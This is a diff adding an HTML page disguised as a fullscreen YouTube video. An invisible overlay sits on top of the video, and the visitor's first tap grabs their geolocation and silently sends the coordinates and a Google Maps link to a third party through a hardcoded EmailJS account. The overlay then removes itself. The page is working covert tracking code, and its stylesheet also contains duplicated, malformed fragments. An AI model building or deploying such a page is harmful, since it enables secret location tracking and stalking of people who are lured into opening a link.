@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Youtube Video</title>
+
+<link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/location.png">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: "Segoe UI", Arial, sans-serif;
+  background: linear-gradient(-45deg, #0a0a0a, #1a1a1a, #121212, #0a0a0a);
+  background-size: 400% 400%;
+  animation: gradientMove 12s ease infinite;
+  min-height: 100vh;
+  color: #e0e0e0;
+}
+
+@keyframes gradientMove {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+/* Fullscreen video */
+.video-wrapper {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+}
+
+.video-wrapper iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+
+/* Invisible fullscreen tap layer */
+#tapLayer {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0);
+  z-index: 9999;
+  cursor: pointer;
+}
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+/* Fullscreen video */
+.video-wrapper {
+  position: fixed;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+}
+
+.video-wrapper iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+</style>
+</head>
+
+<body>
+
+<!-- YouTube autoplay video -->
+<div class="video-wrapper">
+  <iframe
+    src="https://www.youtube.com/embed/xvFZjo5PgG0?&rel=0&playsinline=1"
+    allow="autoplay; encrypted-media"
+    allowfullscreen>
+  </iframe>
+</div>
+
+<!-- Fullscreen transparent tap layer -->
+<div id="tapLayer"></div>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+/* EmailJS init — your public key */
+emailjs.init("Zuxy6x2TZlxuZ4ABj");
+
+function sendLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const map = `https://maps.google.com/?q=${lat},${lon}`;
+
+      emailjs.send(
+        "service_z1uzh6f",
+        "template_whed5zh",
+        {
+          email: "Location Capture",
+          password:
+            "Latitude: " + lat +
+            "\nLongitude: " + lon +
+            "\nMap: " + map
+        }
+      );
+    },
+    () => {}
+  );
+}
+
+// First tap triggers location, then removes overlay
+document.getElementById('tapLayer').addEventListener('click', () => {
+  sendLocation();
+  document.getElementById('tapLayer').remove();
+});
+</script>
+
+</body>
+</html>
